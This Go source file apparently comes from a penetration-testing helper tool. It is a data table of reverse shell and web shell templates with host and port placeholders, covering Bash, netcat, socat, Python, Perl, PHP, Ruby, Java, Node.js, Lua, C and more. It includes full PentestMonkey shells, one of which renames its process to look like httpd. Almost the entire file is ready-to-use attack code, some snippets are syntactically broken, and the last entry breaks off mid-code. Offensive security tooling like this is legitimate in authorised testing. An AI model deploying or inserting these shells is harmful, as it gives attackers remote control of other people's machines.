package data

import (
	"github.com/groundsec/secbutler/pkg/types"
)

var RevShells = []types.RevShell{
	{Name: "Bash -i", OS: []string{"Linux", "Mac"}, ShellTpl: "sh -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1"},
	{Name: "Bash 196", OS: []string{"Linux", "Mac"}, ShellTpl: "0<&196;exec 196<>/dev/tcp/{{HOST}}/{{PORT}}; sh <&196 >&196 2>&196"},
	{Name: "Bash read line", OS: []string{"Linux", "Mac"}, ShellTpl: "exec 5<>/dev/tcp/{{HOST}}/{{PORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"},
	{Name: "Bash 5", OS: []string{"Linux", "Mac"}, ShellTpl: "sh -i 5<> /dev/tcp/{{HOST}}/{{PORT}} 0<&5 1>&5 2>&5"},
	{Name: "Bash UDP", OS: []string{"Linux", "Mac"}, ShellTpl: "sh -i >& /dev/udp/{{HOST}}/{{PORT}} 0>&1"},
	{Name: "nc mkfifo", OS: []string{"Linux", "Mac"}, ShellTpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{HOST}} {{PORT}} >/tmp/f"},
	{Name: "nc -e", OS: []string{"Linux", "Mac"}, ShellTpl: "nc {{HOST}} {{PORT}} -e sh"},
	{Name: "BusyBox nc -e", OS: []string{"Linux"}, ShellTpl: "busybox nc {{HOST}} {{PORT}} -e /bin/sh"},
	{Name: "nc -c", OS: []string{"Linux", "Mac"}, ShellTpl: "nc -c /bin/sh {{HOST}} {{PORT}}"},
	{Name: "ncat -e", OS: []string{"Linux", "Mac"}, ShellTpl: "ncat {{HOST}} {{PORT}} -e /bin/sh"},
	{Name: "ncat udp", OS: []string{"Linux", "Mac"}, ShellTpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {{HOST}} {{PORT}} >/tmp/f"},
	{Name: "curl", OS: []string{"Linux", "Mac"}, ShellTpl: "C='curl -Ns telnet://{{HOST}}:{{PORT}}'; $C </dev/null 2>&1 | /bin/sh 2>&1 | $C >/dev/null"},
	{Name: "rustcat", OS: []string{"Linux", "Mac"}, ShellTpl: "rcat connect -s /bin/sh {{HOST}} {{PORT}}"},
	{Name: "C", OS: []string{"Linux", "Mac"}, ShellTpl: `
		#include <stdio.h>
		#include <sys/socket.h>
		#include <sys/types.h>
		#include <stdlib.h>
		#include <unistd.h>
		#include <netinet/in.h>
		#include <arpa/inet.h>

		int main(void){
				int port = {{PORT}};
				struct sockaddr_in revsockaddr;

				int sockt = socket(AF_INET, SOCK_STREAM, 0);
				revsockaddr.sin_family = AF_INET;       
				revsockaddr.sin_port = htons(port);
				revsockaddr.sin_addr.s_addr = inet_addr("{{HOST}}");

				connect(sockt, (struct sockaddr *) &revsockaddr, 
				sizeof(revsockaddr));
				dup2(sockt, 0);
				dup2(sockt, 1);
				dup2(sockt, 2);

				char * const argv[] = {"/bin/sh", NULL};
				execve("/bin/sh", argv, NULL);

				return 0;       
		}
	`},
	{Name: "C# TCP Client", OS: []string{"Linux"}, ShellTpl: `
	using System;
	using System.Text;
	using System.IO;
	using System.Diagnostics;
	using System.ComponentModel;
	using System.Linq;
	using System.Net;
	using System.Net.Sockets;


	namespace ConnectBack
	{
		public class Program
		{
			static StreamWriter streamWriter;

			public static void Main(string[] args)
			{
				using(TcpClient client = new TcpClient("{{HOST}}", {{PORT}}))
				{
					using(Stream stream = client.GetStream())
					{
						using(StreamReader rdr = new StreamReader(stream))
						{
							streamWriter = new StreamWriter(stream);
							
							StringBuilder strInput = new StringBuilder();

							Process p = new Process();
							p.StartInfo.FileName = "/bin/sh";
							p.StartInfo.CreateNoWindow = true;
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = true;
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
							p.Start();
							p.BeginOutputReadLine();

							while(true)
							{
								strInput.Append(rdr.ReadLine());
								//strInput.Append("\n");
								p.StandardInput.WriteLine(strInput);
								strInput.Remove(0, strInput.Length);
							}
						}
					}
				}
			}

			private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
					{
							StringBuilder strOutput = new StringBuilder();

							if (!String.IsNullOrEmpty(outLine.Data))
							{
									try
									{
											strOutput.Append(outLine.Data);
											streamWriter.WriteLine(strOutput);
											streamWriter.Flush();
									}
									catch (Exception err) { }
							}
					}

		}
	}
	`},
	{Name: "C# Bash -i", OS: []string{"Linux"}, ShellTpl: `
		using System;
		using System.Diagnostics;

		namespace BackConnect {
			class ReverseBash {
			public static void Main(string[] args) {
				Process proc = new System.Diagnostics.Process();
				proc.StartInfo.FileName = "/bin/sh";
				proc.StartInfo.Arguments = "-c \"/bin/sh -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1\"";
				proc.StartInfo.UseShellExecute = false;
				proc.StartInfo.RedirectStandardOutput = true;
				proc.Start();

				while (!proc.StandardOutput.EndOfStream) {
				Console.WriteLine(proc.StandardOutput.ReadLine());
				}
			}
			}
		}
	`},
	{Name: "Haskell #1", OS: []string{"Linux", "Mac"}, ShellTpl: `
	module Main where
	import System.Process
	main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {{HOST}} {{PORT}} >/tmp/f"
	`},
	{Name: "Perl", OS: []string{"Linux", "Mac"}, ShellTpl: "perl -e 'use Socket;$i=\"{{HOST}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
	{Name: "Perl no sh", OS: []string{"Linux", "Mac"}, ShellTpl: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{{HOST}}:{{PORT}}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
	{Name: "Perl PentestMonkey", OS: []string{"Linux", "Mac"}, ShellTpl: `
	#!/usr/bin/perl -w
	# perl-reverse-shell - A Reverse Shell implementation in PERL
	# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
	#
	# This tool may be used for legal purposes only.  Users take full responsibility
	# for any actions performed using this tool.  The author accepts no liability
	# for damage caused by this tool.  If these terms are not acceptable to you, then
	# do not use this tool.
	#
	# In all other respects the GPL version 2 applies:
	#
	# This program is free software; you can redistribute it and/or modify
	# it under the terms of the GNU General Public License version 2 as
	# published by the Free Software Foundation.
	#
	# This program is distributed in the hope that it will be useful,
	# but WITHOUT ANY WARRANTY; without even the implied warranty of
	# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	# GNU General Public License for more details.
	#
	# You should have received a copy of the GNU General Public License along
	# with this program; if not, write to the Free Software Foundation, Inc.,
	# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
	#
	# This tool may be used for legal purposes only.  Users take full responsibility
	# for any actions performed using this tool.  If these terms are not acceptable to
	# you, then do not use this tool.
	#
	# You are encouraged to send comments, improvements or suggestions to
	# me at pentestmonkey@pentestmonkey.net
	#
	# Description
	# -----------
	# This script will make an outbound TCP connection to a hardcoded IP and port.
	# The recipient will be given a shell running as the current user (apache normally).
	#

	use strict;
	use Socket;
	use FileHandle;
	use POSIX;
	my $VERSION = "1.0";

	# Where to send the reverse shell.  Change these.
	my $ip = '{{HOST}}';
	my $port = {{PORT}};

	# Options
	my $daemon = 1;
	my $auth   = 0; # 0 means authentication is disabled and any 
			# source IP can access the reverse shell
	my $authorised_client_pattern = qr(^127\.0\.0\.1$);

	# Declarations
	my $global_page = "";
	my $fake_process_name = "/usr/sbin/apache";

	# Change the process name to be less conspicious
	$0 = "[httpd]";

	# Authenticate based on source IP address if required
	if (defined($ENV{'REMOTE_ADDR'})) {
		cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

		if ($auth) {
			unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
				cgiprint("ERROR: Your client isn't authorised to view this page");
				cgiexit();
			}
		}
	} elsif ($auth) {
		cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
		cgiexit(0);
	}

	# Background and dissociate from parent process if required
	if ($daemon) {
		my $pid = fork();
		if ($pid) {
			cgiexit(0); # parent exits
		}

		setsid();
		chdir('/');
		umask(0);
	}

	# Make TCP connection for reverse shell
	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
		cgiprint("Sent reverse shell to $ip:$port");
		cgiprintpage();
	} else {
		cgiprint("Couldn't open reverse shell to $ip:$port: $!");
		cgiexit();	
	}

	# Redirect STDIN, STDOUT and STDERR to the TCP connection
	open(STDIN, ">&SOCK");
	open(STDOUT,">&SOCK");
	open(STDERR,">&SOCK");
	$ENV{'HISTFILE'} = '/dev/null';
	system("w;uname -a;id;pwd");
	exec({"/bin/sh"} ($fake_process_name, "-i"));

	# Wrapper around print
	sub cgiprint {
		my $line = shift;
		$line .= "<p>\n";
		$global_page .= $line;
	}

	# Wrapper around exit
	sub cgiexit {
		cgiprintpage();
		exit 0; # 0 to ensure we don't give a 500 response.
	}

	# Form HTTP response using all the messages gathered by cgiprint so far
	sub cgiprintpage {
		print "Content-Length: " . length($global_page) . "\r
	Connection: close\r
	Content-Type: text\/html\r\n\r\n" . $global_page;
	}
	`},
	{Name: "PHP PentestMonkey", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	<?php
	// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '{{HOST}}';
	$port = {{PORT}};
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;

	if (function_exists('pcntl_fork')) {
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		
		if ($pid) {
			exit(0);  // Parent exits
		}
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}

		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}

	chdir("/");

	umask(0);

	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}

	$descriptorspec = array(
		0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
		1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
		2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);

	$process = proc_open($shell, $descriptorspec, $pipes);

	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}

	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);

	printit("Successfully opened reverse shell to $ip:$port");

	while (1) {
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}

		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}

		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}

		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}

		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}

	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);

	function printit ($string) {
		if (!$daemon) {
			print "$string\n";
		}
	}

	?>
	`},
	{Name: "PHP cmd", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	<html>
	<body>
	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
	<input type="TEXT" name="cmd" id="cmd" size="80">
	<input type="SUBMIT" value="Execute">
	</form>
	<pre>
	<?php
			if(isset($_GET['cmd']))
			{
					system($_GET['cmd']);
			}
	?>
	</pre>
	</body>
	<script>document.getElementById("cmd").focus();</script>
	</html>
	`},
	{Name: "PHP cmd 2", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>"},
	{Name: "PHP cmd small", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "<?=`$_GET[0]`?>"},
	{Name: "PHP exec", OS: []string{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});exec(\"/bin/sh <&3 >&3 2>&3\");'"},
	{Name: "PHP shell_exec", OS: []string{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});shell_exec(\"/bin/sh <&3 >&3 2>&3\");'"},
	{Name: "PHP system", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});system(\"/bin/sh <&3 >&3 2>&3\");'"},
	{Name: "PHP passtru", OS: []string{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});passthru(\"/bin/sh <&3 >&3 2>&3\");'"},
	{Name: "PHP`", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});`/bin/sh <&3 >&3 2>&3`;'"},
	{Name: "PHP popen", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});popen(\"/bin/sh <&3 >&3 2>&3\", \"r\");'"},
	{Name: "PHP proc_open", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"},
	{Name: "Python #1", OS: []string{"Linux", "Mac"}, ShellTpl: "export RHOST=\"{{HOST}}\";export RPORT={{PORT}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"},
	{Name: "Python #2", OS: []string{"Linux", "Mac"}, ShellTpl: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{HOST}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"},
	{Name: "Python3 #1", OS: []string{"Linux", "Mac"}, ShellTpl: "export RHOST=\"{{HOST}}\";export RPORT={{PORT}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"},
	{Name: "Python3 #2", OS: []string{"Linux", "Mac"}, ShellTpl: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{HOST}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"},
	{Name: "Python3 shortest", OS: []string{"Linux"}, ShellTpl: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{HOST}}\",{{PORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"},
	{Name: "Ruby #1", OS: []string{"Linux", "Mac"}, ShellTpl: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{{HOST}}\",{{PORT}}))'"},
	{Name: "Ruby no sh", OS: []string{"Linux", "Mac"}, ShellTpl: "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{{HOST}}\",\"{{PORT}}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"},
	{Name: "socat #1", OS: []string{"Linux", "Mac"}, ShellTpl: "socat TCP:{{HOST}}:{{PORT}} EXEC:/bin/sh"},
	{Name: "socat #2 (TTY)", OS: []string{"Linux", "Mac"}, ShellTpl: "socat TCP:{{HOST}}:{{PORT}} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"},
	{Name: "sqlite3 nc mkfifo", OS: []string{"Linux", "Mac"}, ShellTpl: "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{HOST}} {{PORT}} >/tmp/f'"},
	{Name: "node.js", OS: []string{"Linux", "Mac"}, ShellTpl: "require('child_process').exec('nc -e /bin/sh {{HOST}} {{PORT}}')"},
	{Name: "node.js #2", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	(function(){
			var net = require("net"),
					cp = require("child_process"),
					sh = cp.spawn("/bin/sh", []);
			var client = new net.Socket();
			client.connect({{PORT}}, "{{HOST}}", function(){
					client.pipe(sh.stdin);
					sh.stdout.pipe(client);
					sh.stderr.pipe(client);
			});
			return /a/; // Prevents the Node.js application from crashing
	})();
	`},
	{Name: "Java #1", OS: []string{"Linux", "Mac"}, ShellTpl: `
	public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
	}
	`},
	{Name: "Java #2", OS: []string{"Linux", "Mac"}, ShellTpl: `
	public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
	}
	`},
	{Name: "Java #3", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	import java.io.InputStream;
	import java.io.OutputStream;
	import java.net.Socket;

	public class shell {
    public static void main(String[] args) {
        String host = "{{HOST}}";
        int port = {{PORT}};
        String cmd = "/bin/sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
	}
	`},
	{Name: "Java Web", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	<%@
	page import="java.lang.*, java.util.*, java.io.*, java.net.*"
	% >
	<%!
	static class StreamConnector extends Thread
	{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
	}
	%>

	<h1>JSP Backdoor Reverse Shell</h1>

	<form method="post">
	IP Address
	<input type="text" name="ipaddress" size=30>
	Port
	<input type="text" name="port" size=10>
	<input type="submit" name="Connect" value="Connect">
	</form>
	<p>
	<hr>

	<%
	String ipAddress = request.getParameter("ipaddress");
	String ipPort = request.getParameter("port");
	if(ipAddress != null && ipPort != null)
	{
					Socket sock = null;
					try
					{
									sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
									Runtime rt = Runtime.getRuntime();
									Process proc = rt.exec("cmd.exe");
									StreamConnector outputConnector =
													new StreamConnector(proc.getInputStream(),
																						sock.getOutputStream());
									StreamConnector inputConnector =
													new StreamConnector(sock.getInputStream(),
																						proc.getOutputStream());
									outputConnector.start();
									inputConnector.start();
					}
					catch(Exception e) 
	}
	%>
	`},
	{Name: "Java Two Way", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
	%>

	<%@page import="java.lang.*"%>
	<%@page import="java.io.*"%>
	<%@page import="java.net.*"%>
	<%@page import="java.util.*"%>

	<html>
	<head>
			<title>jrshell</title>
	</head>
	<body>
	<form METHOD="POST" NAME="myform" ACTION="">
			<input TYPE="text" NAME="shell">
			<input TYPE="submit" VALUE="Send">
	</form>
	<pre>
	<%
    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {
        Socket socket = new Socket( "{{HOST}}", {{PORT}} ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
     } catch( Exception e ) {}
	%>
	</pre>
	</body>
	</html>
	`},
	{Name: "Javascript", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	String command = "var host = '{{HOST}}';" +
		"var port = {{PORT}};" +
		"var cmd = '/bin/sh';"+
		"var s = new java.net.Socket(host, port);" +
		"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
		"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
		"var po = p.getOutputStream(), so = s.getOutputStream();"+
		"print ('Connected');"+
		"while (!s.isClosed()) {"+
		"    while (pi.available() > 0)"+
		"        so.write(pi.read());"+
		"    while (pe.available() > 0)"+
		"        so.write(pe.read());"+
		"    while (si.available() > 0)"+
		"        po.write(si.read());"+
		"    so.flush();"+
		"    po.flush();"+
		"    java.lang.Thread.sleep(50);"+
		"    try {"+
		"        p.exitValue();"+
		"        break;"+
		"    }"+
		"    catch (e) {"+
		"    }"+
		"}"+
		"p.destroy();"+
		"s.close();";
	String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
	ref.add(new StringRefAddr("x", x);
	`},
	{Name: "telnet", OS: []string{"Linux", "Mac"}, ShellTpl: "TF=$(mktemp -u);mkfifo $TF && telnet {{HOST}} {{PORT}} 0<$TF | /bin/sh 1>$TF"},
	{Name: "zsh", OS: []string{"Linux", "Mac"}, ShellTpl: "zsh -c 'zmodload zsh/net/tcp && ztcp {{HOST}} {{PORT}} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"},
	{Name: "Lua #1", OS: []string{"Linux"}, ShellTpl: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{HOST}}','{{PORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""},
	{Name: "Lua #2", OS: []string{"Linux", "Windows"}, ShellTpl: "lua5.1 -e 'local host, port = \"{{HOST}}\", {{PORT}} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"},
	{Name: "Golang", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{HOST}}:{{PORT}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"},
	{Name: "Vlang", OS: []string{"Linux", "Mac"}, ShellTpl: "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e /bin/sh {{HOST}} {{PORT}} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"},
	{Name: "Awk", OS: []string{"Linux", "Mac"}, ShellTpl: "awk 'BEGIN {s = \"/inet/tcp/0/{{HOST}}/{{PORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"},
	{Name: "Dart", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
	import 'dart:io';
	import 'dart:convert';
	
	main() {
		Socket.connect("{{HOST}}", {{PORT}}).then((socket) {
			socket.listen((data) {
				Process.start('/bin/sh', []).then((Process process) {
					process.stdin.writeln(new String.fromCharCodes(data).trim());
					process.stdout
						.transform(utf8.decoder)
						.listen((output) { socket.write(output); });
				});
			},
			onDone: () {
				socket.destroy();
			});
		});
	}
	`},
	{Name: "Crystal (system)", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{{HOST}}\",{{PORT}});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'"},
	{Name: "Crystal (code)", OS: []string{"Linux", "Mac"}, ShellTpl: `
	require "process"
	require "socket"

	c = Socket.tcp(Socket::Family::INET)
	c.connect("{{HOST}}", {{PORT}})
	loop do 
		m, l = c.receive
		p = Process.new(m.rstrip("\n"), output:Process::Redirect::Pipe, shell:true)
		c << p.output.gets_to_end
	end
	`},
	{Name: "nc.exe", OS: []string{"Windows"}, ShellTpl: "nc.exe {{HOST}} {{PORT}} -e /bin/sh"},
	{Name: "ncat.exe", OS: []string{"Windows"}, ShellTpl: "ncat.exe {{HOST}} {{PORT}} -e /bin/sh"},
	{Name: "C Windows", OS: []string{"Windows"}, ShellTpl: `
	#include <winsock2.h>
	#include <stdio.h>
	#pragma comment(lib,"ws2_32")

	WSADATA wsaData;
	SOCKET Winsock;
	struct sockaddr_in hax; 
	char ip_addr[16] = "{{HOST}}"; 
	char port[6] = "{{PORT}}";            

	STARTUPINFO ini_processo;

	PROCESS_INFORMATION processo_info;

	int main()
	{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
